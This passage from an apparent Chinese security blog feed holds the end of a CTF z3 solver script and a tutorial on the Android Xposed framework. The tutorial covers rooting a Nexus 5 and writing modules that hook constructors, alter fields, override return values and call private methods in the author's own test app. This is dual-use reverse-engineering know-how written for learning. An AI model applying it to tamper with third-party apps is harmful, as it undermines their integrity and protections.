class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">32</span>)]<br><span class="hljs-keyword">if</span> (s.check() == sat):<br>    model = s.model()<br>    <span class="hljs-built_in">print</span>(model)<br>    flag=<span class="hljs-string">&quot;&quot;</span><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">32</span>):<br>        <span class="hljs-keyword">if</span> (model[x[i]] != <span class="hljs-literal">None</span>):<br>            flag += <span class="hljs-built_in">chr</span>(model[x[i]].as_long().real)<br>        <span class="hljs-keyword">else</span>:<br>            flag += <span class="hljs-string">&quot; &quot;</span><br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;&quot;&#x27;</span> + flag + <span class="hljs-string">&#x27;&quot;&#x27;</span>)<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>CTF赛题writeup</category>
      
    </categories>
    
    
    <tags>
      
      <tag>CTF</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Xposed相关学习</title>
    <link href="/2021/08/10/Xposed%E7%9B%B8%E5%85%B3%E5%AD%A6%E4%B9%A0/"/>
    <url>/2021/08/10/Xposed%E7%9B%B8%E5%85%B3%E5%AD%A6%E4%B9%A0/</url>
    
    <content type="html"><![CDATA[<h1 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h1><p>Xposed框架是一款可以在不修改<a href="http://www.manosp.com/wp-content/themes/begin-lts/inc/go.php?url=https://baike.baidu.com/item/APK">APK</a>的情况下影响程序运行(修改系统)的框架服务，基于它可以制作出许多功能强大的模块，且在功能不冲突的情况下同时运作。</p><h1 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h1><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs awk">Xposed框架的原理是替换安卓系统<span class="hljs-regexp">/System/</span>bin目录下的文件，从而实现对系统某些功能的替换，进而给予基于 Xposed 框架开发的App更多权限。<br>Xposed通过替换<span class="hljs-regexp">/system/</span>bin/app_process程序控制zygote进程，使得app_process在启动过程中会加载XposedBridge.jar这个jar包，从而完成对Zygote进程及其创建的Dalvik虚拟机的劫持;当系统中安装了 Xposed Framework 之后，会对 app_process 进行扩展，也就是说，Xposed Framework 会拿自己实现的 app_process 覆盖掉 Android 原生提供的 app_process 文件，当系统启动的时候，就会加载由 Xposed Framework 替换过的进程文件，并且XposedFramework 还有一个 jar 包，系统启动的时候，也会加载这个包：XposedBridge.jar。<br>Xposed框架实现Hook的原理介绍: Zygote进程是 Android 的核心，每运行一个 app，Zygote 就会 fork 一个虚拟机实例来运行 app。Zygote 的启动配置在<span class="hljs-regexp">/init.rc 脚本中，由系统启动的时候开启此进程，对应的执行文件是/</span>system<span class="hljs-regexp">/bin/</span>app_process，这个文件完成类库加载及一些函数调用的工作。当系统中安装了 Xposed 框架 之后，会对 app_process 进行扩展，也就是说，Xposed 框架会拿自己实现的 app_process 覆盖掉 Android 原生提供的 app_process 文件，当系统启动的时候，就会加载由 Xposed Framework 替换过的进程文件，并且，Xposed框架 还定义了一个 jar 包，系统启动的时候，也会加载这个XposedBridge包。<br></code></pre></td></tr></table></figure><h1 id="安装和使用"><a href="#安装和使用" class="headerlink" title="安装和使用"></a>安装和使用</h1><p>xposed源码：<a href="https://github.com/rovo89">https://github.com/rovo89</a></p><p>使用nexus 5刷机为android6.0,刷机时要注意fastboot版本，否则可能失败。</p><p>查看对应的android版本与设备型号：<a href="https://source.android.google.cn/setup/start/build-numbers">https://source.android.google.cn/setup/start/build-numbers</a></p><p>对应的官方镜像：<a href="https://developers.google.cn/android/images#hammerhead">https://developers.google.cn/android/images#hammerhead</a></p><p>刷入twrp，将superSU.zip上传到sdcard，通过recovery进行安装。</p><p>选择对应的xposed版本：<a href="https://dl-xda.xposed.info/framework/">https://dl-xda.xposed.info/framework/</a></p><p>将对应版本的zip包上传至sdcard，通过recovery进行安装。</p><p>安装完成之后，我们进行简单的插件开发。</p><h2 id="hook构造方法"><a href="#hook构造方法" class="headerlink" title="hook构造方法"></a>hook构造方法</h2><p>新建basic activity项目，在AndroidManifest.xml中插入如下代码：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs xml">xposed识别标志为true<br><span class="hljs-tag">&lt;<span class="hljs-name">meta-data</span></span><br><span class="hljs-tag">    <span class="hljs-attr">android:name</span>=<span class="hljs-string">&quot;xposedmodule&quot;</span></span><br><span class="hljs-tag">    <span class="hljs-attr">android:value</span>=<span class="hljs-string">&quot;true&quot;</span> /&gt;</span><br>xposed模块名称<br><span class="hljs-tag">&lt;<span class="hljs-name">meta-data</span></span><br><span class="hljs-tag">    <span class="hljs-attr">android:name</span>=<span class="hljs-string">&quot;xposeddescription&quot;</span></span><br><span class="hljs-tag">    <span class="hljs-attr">android:value</span>=<span class="hljs-string">&quot;这是一个Xposed模块&quot;</span> /&gt;</span><br>最低版本<br><span class="hljs-tag">&lt;<span class="hljs-name">meta-data</span></span><br><span class="hljs-tag">    <span class="hljs-attr">android:name</span>=<span class="hljs-string">&quot;xposedminversion&quot;</span></span><br><span class="hljs-tag">    <span class="hljs-attr">android:value</span>=<span class="hljs-string">&quot;54&quot;</span> /&gt;</span><br></code></pre></td></tr></table></figure><p><img src="/2021/08/10/Xposed%E7%9B%B8%E5%85%B3%E5%AD%A6%E4%B9%A0/image-20210811122103879.png" alt="image-20210811122103879"></p><p>然后手机中xposed就会多出一个模块，成功安装。</p><p>添加如下代码：</p><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-attribute">compileOnly</span> <span class="hljs-string">&#x27;de.robv.android.xposed:api:82&#x27;</span><br>compileOnly <span class="hljs-string">&#x27;de.robv.android.xposed:api:82:sources&#x27;</span><br></code></pre></td></tr></table></figure><p><img src="/2021/08/10/Xposed%E7%9B%B8%E5%85%B3%E5%AD%A6%E4%B9%A0/image-20210811155854112.png" alt="image-20210811155854112"></p><p>添加assert文件夹：</p><p><img src="/2021/08/10/Xposed%E7%9B%B8%E5%85%B3%E5%AD%A6%E4%B9%A0/image-20210811160123192.png" alt="image-20210811160123192"></p><p>在xposed_init中添加入口点：</p><p><img src="/2021/08/10/Xposed%E7%9B%B8%E5%85%B3%E5%AD%A6%E4%B9%A0/image-20210811160505147.png" alt="image-20210811160505147"></p><p>编写代码hook构造方法：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.example.xposed_test;<br><br><span class="hljs-keyword">import</span> android.util.Log;<br><br><span class="hljs-keyword">import</span> de.robv.android.xposed.IXposedHookLoadPackage;<br><span class="hljs-keyword">import</span> de.robv.android.xposed.XC_MethodHook;<br><span class="hljs-keyword">import</span> de.robv.android.xposed.XposedBridge;<br><span class="hljs-keyword">import</span> de.robv.android.xposed.XposedHelpers;<br><span class="hljs-keyword">import</span> de.robv.android.xposed.callbacks.XC_LoadPackage;<br><br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">s0</span> <span class="hljs-keyword">implements</span> <span class="hljs-title">IXposedHookLoadPackage</span> </span>&#123;<br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">handleLoadPackage</span><span class="hljs-params">(XC_LoadPackage.LoadPackageParam lpparam)</span> <span class="hljs-keyword">throws</span> Throwable </span>&#123;<br>        <span class="hljs-comment">//过滤包名</span><br>        <span class="hljs-keyword">if</span>(lpparam.packageName.equals(<span class="hljs-string">&quot;com.example.s0_test&quot;</span>))&#123;<br>            Log.e(<span class="hljs-string">&quot;s1lenc3&quot;</span>, <span class="hljs-string">&quot;I am s0_test&quot;</span>);<br>            <span class="hljs-comment">//加载类</span><br>            Class s0 = lpparam.classLoader.loadClass(<span class="hljs-string">&quot;com.example.s0_test.book&quot;</span>);<br>            <span class="hljs-comment">//没有参数的构造方法</span><br>            XposedHelpers.findAndHookConstructor(s0, <span class="hljs-keyword">new</span> XC_MethodHook() &#123;<br>                <span class="hljs-meta">@Override</span><br>                <span class="hljs-function"><span class="hljs-keyword">protected</span> <span class="hljs-keyword">void</span> <span class="hljs-title">beforeHookedMethod</span><span class="hljs-params">(MethodHookParam param)</span> <span class="hljs-keyword">throws</span> Throwable </span>&#123;<br>                    <span class="hljs-keyword">super</span>.beforeHookedMethod(param);<br>                    Log.e(<span class="hljs-string">&quot;s1lenc3&quot;</span>, <span class="hljs-string">&quot;my book() is called&quot;</span>);<br>                    XposedBridge.log(<span class="hljs-string">&quot;my book is called&quot;</span>);<br><br>                &#125;<br><br>                <span class="hljs-meta">@Override</span><br>                <span class="hljs-function"><span class="hljs-keyword">protected</span> <span class="hljs-keyword">void</span> <span class="hljs-title">afterHookedMethod</span><span class="hljs-params">(MethodHookParam param)</span> <span class="hljs-keyword">throws</span> Throwable </span>&#123;<br>                    <span class="hljs-keyword">super</span>.afterHookedMethod(param);<br>                    Log.e(<span class="hljs-string">&quot;s1lenc3&quot;</span>, <span class="hljs-string">&quot;my book() is over&quot;</span>);<br>                    XposedBridge.log(<span class="hljs-string">&quot;my book is over&quot;</span>);<br>                &#125;<br>            &#125;);<br>            <span class="hljs-comment">//一个参数的构造方法</span><br>            XposedHelpers.findAndHookConstructor(s0, <span class="hljs-keyword">int</span>.class, <span class="hljs-keyword">new</span> XC_MethodHook() &#123;<br>                <span class="hljs-meta">@Override</span><br>                <span class="hljs-function"><span class="hljs-keyword">protected</span> <span class="hljs-keyword">void</span> <span class="hljs-title">beforeHookedMethod</span><span class="hljs-params">(MethodHookParam param)</span> <span class="hljs-keyword">throws</span> Throwable </span>&#123;<br>                    <span class="hljs-keyword">super</span>.beforeHookedMethod(param);<br>                    Object[] a = param.args;<br>                    a[<span class="hljs-number">0</span>] = <span class="hljs-number">13</span>;<br><br>                &#125;<br><br>                <span class="hljs-meta">@Override</span><br>                <span class="hljs-function"><span class="hljs-keyword">protected</span> <span class="hljs-keyword">void</span> <span class="hljs-title">afterHookedMethod</span><span class="hljs-params">(MethodHookParam param)</span> <span class="hljs-keyword">throws</span> Throwable </span>&#123;<br>                    <span class="hljs-keyword">super</span>.afterHookedMethod(param);<br>                    Log.e(<span class="hljs-string">&quot;s1lenc3&quot;</span>, <span class="hljs-string">&quot;my book(99) is over!&quot;</span>);<br>                &#125;<br>            &#125;);<br>            <span class="hljs-comment">//两个参数的构造方法</span><br>            XposedHelpers.findAndHookConstructor(s0, <span class="hljs-keyword">int</span>.class, String.class, <span class="hljs-keyword">new</span> XC_MethodHook() &#123;<br>                <span class="hljs-meta">@Override</span><br>                <span class="hljs-function"><span class="hljs-keyword">protected</span> <span class="hljs-keyword">void</span> <span class="hljs-title">beforeHookedMethod</span><span class="hljs-params">(MethodHookParam param)</span> <span class="hljs-keyword">throws</span> Throwable </span>&#123;<br>                    <span class="hljs-keyword">super</span>.beforeHookedMethod(param);<br>                    Object[] a = param.args;<br>                    a[<span class="hljs-number">0</span>] = <span class="hljs-number">13</span>;<br>                    a[<span class="hljs-number">1</span>] = <span class="hljs-string">&quot;android软件安全权威指南&quot;</span>;<br><br>                &#125;<br><br>                <span class="hljs-meta">@Override</span><br>                <span class="hljs-function"><span class="hljs-keyword">protected</span> <span class="hljs-keyword">void</span> <span class="hljs-title">afterHookedMethod</span><span class="hljs-params">(MethodHookParam param)</span> <span class="hljs-keyword">throws</span> Throwable </span>&#123;<br>                    <span class="hljs-keyword">super</span>.afterHookedMethod(param);<br>                    Log.e(<span class="hljs-string">&quot;s1lenc3&quot;</span>, <span class="hljs-string">&quot;my book(99,android....) is over!&quot;</span>);<br>                &#125;<br>            &#125;);<br>            <span class="hljs-comment">//三个参数的构造方法</span><br>            XposedHelpers.findAndHookConstructor(s0, <span class="hljs-keyword">int</span>.class, String.class, <span class="hljs-keyword">boolean</span>.class, <span class="hljs-keyword">new</span> XC_MethodHook() &#123;<br>                <span class="hljs-meta">@Override</span><br>                <span class="hljs-function"><span class="hljs-keyword">protected</span> <span class="hljs-keyword">void</span> <span class="hljs-title">beforeHookedMethod</span><span class="hljs-params">(MethodHookParam param)</span> <span class="hljs-keyword">throws</span> Throwable </span>&#123;<br>                    <span class="hljs-keyword">super</span>.beforeHookedMethod(param);<br>                    Object[] a = param.args;<br>                    a[<span class="hljs-number">0</span>] = <span class="hljs-number">13</span>;<br>                    a[<span class="hljs-number">1</span>] = <span class="hljs-string">&quot;android软件安全权威指南&quot;</span>;<br>                    a[<span class="hljs-number">2</span>] = <span class="hljs-keyword">true</span>;<br>                &#125;<br><br>                <span class="hljs-meta">@Override</span><br>                <span class="hljs-function"><span class="hljs-keyword">protected</span> <span class="hljs-keyword">void</span> <span class="hljs-title">afterHookedMethod</span><span class="hljs-params">(MethodHookParam param)</span> <span class="hljs-keyword">throws</span> Throwable </span>&#123;<br>                    <span class="hljs-keyword">super</span>.afterHookedMethod(param);<br>                    Log.e(<span class="hljs-string">&quot;s1lenc3&quot;</span>, <span class="hljs-string">&quot;my book(99,android...., true) is over!&quot;</span>);<br>                &#125;<br>            &#125;);<br><br><br>        &#125;<br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><p>被hook的类的代码：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.example.s0_test;<br><br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">book</span> </span>&#123;<br><br>    <span class="hljs-keyword">int</span> id = <span class="hljs-number">0</span>;<br>    String name = <span class="hljs-string">&quot;&quot;</span>;<br>    <span class="hljs-keyword">boolean</span> have = <span class="hljs-keyword">true</span>;<br><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-title">book</span><span class="hljs-params">()</span> </span>&#123;<br><br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-title">book</span><span class="hljs-params">(<span class="hljs-keyword">int</span> a)</span> </span>&#123;<br>        id = a;<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-title">book</span><span class="hljs-params">(<span class="hljs-keyword">int</span> a, String b)</span> </span>&#123;<br>        id = a;<br>        name = b;<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-title">book</span><span class="hljs-params">(<span class="hljs-keyword">int</span> a, String b, <span class="hljs-keyword">boolean</span> c)</span> </span>&#123;<br>        id = a;<br>        name =b;<br>        have = c;<br>    &#125;<br>    <span class="hljs-function"><span class="hljs-keyword">public</span> String  <span class="hljs-title">getString</span><span class="hljs-params">()</span></span>&#123;<br><br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;\nid:&quot;</span>+id+<span class="hljs-string">&quot;\nname:&quot;</span>+name+<span class="hljs-string">&quot;\nhave:&quot;</span>+have;<br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><p>注意：在AndroidManifest.xml中设置exported为false会导致失败，所以不要设置这个属性，如果build失败，使用30版本的build-tools。</p><h2 id="修改属性与一般函数hook"><a href="#修改属性与一般函数hook" class="headerlink" title="修改属性与一般函数hook"></a>修改属性与一般函数hook</h2><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs markdown">修改属性：<br><span class="hljs-bullet"> 1.</span> 通过反射<br><span class="hljs-bullet"> 2.</span> 通过xposed的API<br>hook函数：<br><span class="hljs-bullet"> 1.</span> 一般java函数hook<br><span class="hljs-bullet"> 2.</span> 内部类中的函数hook<br><span class="hljs-bullet"> 3.</span> 匿名内部类的hook<br><span class="hljs-bullet"> 4.</span> 类中jni函数hook<br></code></pre></td></tr></table></figure><p><strong>修改属性</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><code class="hljs java">   <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">handleLoadPackage</span><span class="hljs-params">(XC_LoadPackage.LoadPackageParam lpparam)</span> <span class="hljs-keyword">throws</span> Throwable </span>&#123;<br>        <span class="hljs-comment">//修改属性</span><br>        <span class="hljs-keyword">if</span> (lpparam.packageName.equals(<span class="hljs-string">&quot;com.example.s0_test&quot;</span>)) &#123;<br>            XposedHelpers.findAndHookConstructor(<span class="hljs-string">&quot;com.example.s0_test.book&quot;</span>, lpparam.classLoader, <span class="hljs-keyword">new</span> XC_MethodHook() &#123;<br>                <span class="hljs-meta">@Override</span><br>                <span class="hljs-function"><span class="hljs-keyword">protected</span> <span class="hljs-keyword">void</span> <span class="hljs-title">beforeHookedMethod</span><span class="hljs-params">(MethodHookParam param)</span> <span class="hljs-keyword">throws</span> Throwable </span>&#123;<br>                    <span class="hljs-keyword">super</span>.beforeHookedMethod(param);<br><br><br>                &#125;<br><br>                <span class="hljs-meta">@Override</span><br>                <span class="hljs-function"><span class="hljs-keyword">protected</span> <span class="hljs-keyword">void</span> <span class="hljs-title">afterHookedMethod</span><span class="hljs-params">(MethodHookParam param)</span> <span class="hljs-keyword">throws</span> Throwable </span>&#123;<br>                    <span class="hljs-keyword">super</span>.afterHookedMethod(param);<br><br>                    <span class="hljs-comment">//通过反射</span><br>                    Class ss = lpparam.classLoader.loadClass(<span class="hljs-string">&quot;com.example.s0_test.book&quot;</span>);<br>                    Field id = ss.getDeclaredField(<span class="hljs-string">&quot;id&quot;</span>);<br>                    id.setAccessible(<span class="hljs-keyword">true</span>);<br>                    id.set(param.thisObject, <span class="hljs-number">321</span>);<br><br><br>                    Field name= ss.getDeclaredField(<span class="hljs-string">&quot;name&quot;</span>);<br>                    name.setAccessible(<span class="hljs-keyword">true</span>);<br>                    name.set(param.thisObject, <span class="hljs-string">&quot;s1lenc3&quot;</span>);<br><br>                    Field have = ss.getDeclaredField(<span class="hljs-string">&quot;have&quot;</span>);<br>                    have.setAccessible(<span class="hljs-keyword">true</span>);<br>                    have.set(param.thisObject,<span class="hljs-keyword">false</span>);<br><br>                    <span class="hljs-comment">//xposedAPI</span><br><span class="hljs-comment">//                    XposedHelpers.setIntField(param.thisObject,&quot;id&quot;,123);</span><br><span class="hljs-comment">//                    XposedHelpers.setObjectField(param.thisObject,&quot;name&quot;,&quot;s1lenc3&quot;);</span><br><span class="hljs-comment">//                    XposedHelpers.setBooleanField(param.thisObject,&quot;have&quot;,false);</span><br>                &#125;<br>            &#125;);<br></code></pre></td></tr></table></figure><p><strong>hook函数</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">//一般函数/内部类/匿名内部类函数hook，区别在于第一个参数不同</span><br> <span class="hljs-keyword">if</span>(lpparam.packageName.equals(<span class="hljs-string">&quot;com.example.s0_test&quot;</span>))&#123;<br>     XposedHelpers.findAndHookMethod(<span class="hljs-string">&quot;com.example.s0_test.book$book_plus&quot;</span>, lpparam.classLoader, <span class="hljs-string">&quot;getString&quot;</span>, <span class="hljs-keyword">new</span> XC_MethodHook() &#123;<br>         <span class="hljs-meta">@Override</span><br>         <span class="hljs-function"><span class="hljs-keyword">protected</span> <span class="hljs-keyword">void</span> <span class="hljs-title">beforeHookedMethod</span><span class="hljs-params">(MethodHookParam param)</span> <span class="hljs-keyword">throws</span> Throwable </span>&#123;<br>             <span class="hljs-keyword">super</span>.beforeHookedMethod(param);<br>         &#125;<br><br>         <span class="hljs-meta">@Override</span><br>         <span class="hljs-function"><span class="hljs-keyword">protected</span> <span class="hljs-keyword">void</span> <span class="hljs-title">afterHookedMethod</span><span class="hljs-params">(MethodHookParam param)</span> <span class="hljs-keyword">throws</span> Throwable </span>&#123;<br>             <span class="hljs-keyword">super</span>.afterHookedMethod(param);<br><br>             String str=<span class="hljs-string">&quot;\nbook_plus:\nid:&quot;</span>+<span class="hljs-number">999</span>+<span class="hljs-string">&quot;\nname::&quot;</span>+<span class="hljs-string">&quot;s1lenc3&quot;</span>+<span class="hljs-string">&quot;\nhave:&quot;</span>+<span class="hljs-string">&quot;true&quot;</span>;<br>             param.setResult(str);<br><br>         &#125;<br>     &#125;);<br>   <br>           <span class="hljs-comment">//hook jni  函数</span><br> <span class="hljs-keyword">if</span>(lpparam.packageName.equals(<span class="hljs-string">&quot;com.example.s0_test&quot;</span>))&#123;<br>     XposedHelpers.findAndHookMethod(<span class="hljs-string">&quot;com.example.s0_test.MainActivity&quot;</span>, lpparam.classLoader, <span class="hljs-string">&quot;stringFromJNI&quot;</span>, <span class="hljs-keyword">new</span> XC_MethodHook() &#123;<br>         <span class="hljs-meta">@Override</span><br>         <span class="hljs-function"><span class="hljs-keyword">protected</span> <span class="hljs-keyword">void</span> <span class="hljs-title">beforeHookedMethod</span><span class="hljs-params">(MethodHookParam param)</span> <span class="hljs-keyword">throws</span> Throwable </span>&#123;<br>             <span class="hljs-keyword">super</span>.beforeHookedMethod(param);<br>         &#125;<br><br>         <span class="hljs-meta">@Override</span><br>         <span class="hljs-function"><span class="hljs-keyword">protected</span> <span class="hljs-keyword">void</span> <span class="hljs-title">afterHookedMethod</span><span class="hljs-params">(MethodHookParam param)</span> <span class="hljs-keyword">throws</span> Throwable </span>&#123;<br>             <span class="hljs-keyword">super</span>.afterHookedMethod(param);<br><br>             param.setResult(<span class="hljs-string">&quot;s1lenc3&quot;</span>);<br><br>         &#125;<br>     &#125;);<br> &#125;<br></code></pre></td></tr></table></figure><h1 id="Xposed主动调用"><a href="#Xposed主动调用" class="headerlink" title="Xposed主动调用"></a>Xposed主动调用</h1><ul><li>使用反射完成主动调用</li><li>使用xposedAPI完成主动调用</li><li>私有、公有、静态函数</li><li>获取实例方法<ul><li>通过xposed api</li><li>通过hook构造函数</li><li>通过hook参数</li></ul></li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">//通过反射调用静态方法</span><br>Class bookclass=lpparam.classLoader.loadClass(<span class="hljs-string">&quot;com.example.s0_test.book&quot;</span>);<br>Method publicstatic=bookclass.getDeclaredMethod(<span class="hljs-string">&quot;publicstatic&quot;</span>);<br>String result1 = (String) publicstatic.invoke(<span class="hljs-keyword">null</span>);<br>Log.e(<span class="hljs-string">&quot;s1lenc3_1&quot;</span>, result1);<br><span class="hljs-comment">//通过xposed api调用静态方法</span><br>String result2 = (String) XposedHelpers.callStaticMethod(bookclass, <span class="hljs-string">&quot;publicstatic&quot;</span>);<br>Log.e(<span class="hljs-string">&quot;s1lenc3_2&quot;</span>, result2);<br><span class="hljs-comment">//通过反射获取实例,然后通过反射调用公有方法</span><br>Constructor bookconstru=bookclass.getConstructor(<span class="hljs-keyword">int</span>.class);<br>Object bookobject=bookconstru.newInstance(<span class="hljs-number">1</span>);<br>Method publicmethod=bookclass.getDeclaredMethod(<span class="hljs-string">&quot;publicmethod&quot;</span>);<br>String result3 = (String) publicmethod.invoke(bookobject);<br>Log.e(<span class="hljs-string">&quot;s1lenc3_3&quot;</span>, result3);<br><span class="hljs-comment">//通过xposed获取实例,然后通过xposed api调用私有方法</span><br>Object bookobject1 = XposedHelpers.newInstance(bookclass, <span class="hljs-number">1</span>);<br>Method privatemethod=bookclass.getDeclaredMethod(<span class="hljs-string">&quot;privatemethod&quot;</span>);<br>privatemethod.setAccessible(<span class="hljs-keyword">true</span>);<br>String result4 = (String)XposedHelpers.callMethod(bookobject1, <span class="hljs-string">&quot;privatemethod&quot;</span>);<br>Log.e(<span 